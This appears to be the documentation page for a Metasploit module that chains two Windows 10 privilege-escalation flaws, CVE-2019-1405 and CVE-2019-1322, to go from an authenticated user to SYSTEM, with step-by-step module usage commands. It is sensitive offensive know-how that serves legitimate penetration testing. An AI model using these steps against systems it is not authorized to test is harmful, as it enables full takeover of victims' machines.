## Introduction

This leverages two vulnerabilities on specific builds of Windows 10 to
move from an authenticated user of any level to NT AUTHORITY\LOCAL SERVICE
and then from NT AUTHORITY\LOCAL SERVICE to NT AUTHORITY\SYSTEM.
The first (CVE-2019-1405) uses the UPnP Device Host Service to elevate to
NT AUTHORITY\LOCAL SERVICE
The second (CVE-2019-1322) leverages the Update Orchestrator Service to
elevate from NT AUTHORITY\LOCAL SERVICE to NT AUTHORITY\SYSTEM.

The exploit works by creating a new service, so the exploit may take
up to minute on test systems, and may take longer in the wild.  Adjusting
the exploit_timeout value in the datastore.

## Usage

1. Create a session on the target system under the context of an authenticated user.
2. Begin interacting with the module: `use exploit/windows/local/comahawk`.
3. Set the `PAYLOAD` and configure it correctly.
4. If an existing handler is configured to receive the elevated session, then the module's
   handler should be disabled: `set DisablePayloadHandler true`.
5. Make sure that the `SESSION` value is set to the existing session identifier.
6. Invoke the module: `run`.
